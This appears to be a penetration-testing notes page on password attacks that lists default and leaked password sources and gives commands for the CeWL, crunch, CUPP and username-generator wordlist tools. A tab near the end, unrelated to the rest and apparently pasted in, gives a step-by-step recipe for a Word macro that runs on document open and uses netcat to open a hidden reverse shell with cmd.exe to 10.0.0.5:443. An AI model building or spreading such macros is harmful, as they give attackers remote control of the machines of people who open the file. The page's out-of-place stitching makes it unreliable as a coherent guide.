# Password Attacks

## Theory

Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists.
We will also speak about tools used to perform online and offline password attacks.

## Practice
### Default Passwords
Here are some website lists that provide default passwords for various products.
1 - [Cirt.net](https://cirt.net/passwords)  
2 - [Default-password](https://default-password.info/)
3 - [Datarecovery](https://datarecovery.com/rd/default-passwords/) 

### Leaked Passwords
Here are some website and tools that provide ressources about leaked passwords.
1 - [PwnedOrNot](https://github.com/thewhiteh4t/pwnedOrNot)
2 - [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

### Wordlist from website content
CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.

```bash
cewl -w list.txt -d 5 -m 5 http://target.net
```

### Generate User List
Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames.  

Thankfully, there is a tool [username_generator](https://github.com/therodri2/username_generator.git) that could help create a list with most of the possible combinations if we have a first name and last name.

```bash
python3 username_generator.py -w users.lst
```

### Crunch - Generate Password list
crunch is one of many powerful tools for creating an offline wordlist. With crunch, we can specify numerous options, including min, max, and options

```bash
#min=2 max=2 charset=01234abcd outfile=crunch.txt
crunch 2 2 01234abcd -o crunch.txt
```

Crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:

[@] - lower case alpha characters

[,] - upper case alpha characters

[%] - numeric characters

[^] - special characters including space

```bash
#min=6 max=6 option=pass[0-9][0-9] outfile=stdin
crunch 6 6 -t pass%%
```

### CUPP - Common User Passwords Profiler (OSINT)

[CUPP](https://github.com/Mebus/cupp) is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information.

```bash
#Interactive mod
python3 cupp.py -i

#Pre-created wordlists
python3 cupp.py -l

# Alecto database default logins
python3 cupp.py -a
```

{% tabs %}

{% tab title="Basic Usage" %}

1 - Create new word document (CTRL+N)  
2 - Hit ALT+F11 to go into Macro editor  
3 - Double click into the "This document" and CTRL+C/V the below:  

```bash
#Macro
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```

```bash
#C:\tools\shell.cmd
C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```

4 - ALT+F11 to switch back to the document editing mode  
5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.    


{% endtab %}

{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/passwordattacks" %}

